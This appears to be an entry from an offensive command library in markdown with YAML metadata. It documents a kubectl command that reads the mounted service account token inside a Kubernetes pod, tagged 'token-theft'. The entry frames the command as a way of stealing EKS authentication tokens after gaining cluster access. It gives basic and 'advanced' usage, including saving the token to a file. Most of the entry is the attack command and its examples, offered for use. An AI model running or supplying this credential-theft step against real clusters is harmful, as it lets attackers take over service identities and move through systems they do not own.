---
id: new-uuid-1
name: kubectl-cat-service-account-token
type: command
executor: bash
data: >-
  kubectl exec $_POD_NAME -n $_NAMESPACE -- cat
  /var/run/secrets/kubernetes.io/serviceaccount/token
output: null
created_at: '2023-04-06T03:56:12.505871+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Kubernetes
  - Linux
tags:
  - eks
  - token-theft
  - kubectl
verified: true
validated: true
---

# kubectl-cat-service-account-token

## Command

```bash
kubectl exec $_POD_NAME -n $_NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Description

This command executes inside a Kubernetes pod to read and output the mounted service account token file, useful for stealing authentication tokens in EKS clusters after gaining cluster access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_POD_NAME | Name of the target pod | Yes |
| $_NAMESPACE | Kubernetes namespace of the pod | Yes |
| exec | kubectl subcommand to run command in pod | Built-in |
| -- cat ... | Command to execute: cat the token file | Built-in |

## Examples

### Basic Usage

```bash
kubectl exec my-pod -n default -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Advanced Usage

For silent output, add --quiet flag if supported, or redirect: kubectl exec my-pod -n default -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > token.jwt

## Expected Output

A single line containing the JWT token string, e.g.:
eyJhbGciOiJSUzI1NiIsImtpZCI6Ij... (truncated for security; full token is ~1000+ characters).

## Related

- [[procedures/AWS-EKS-Service-Account-Token-Theft]]
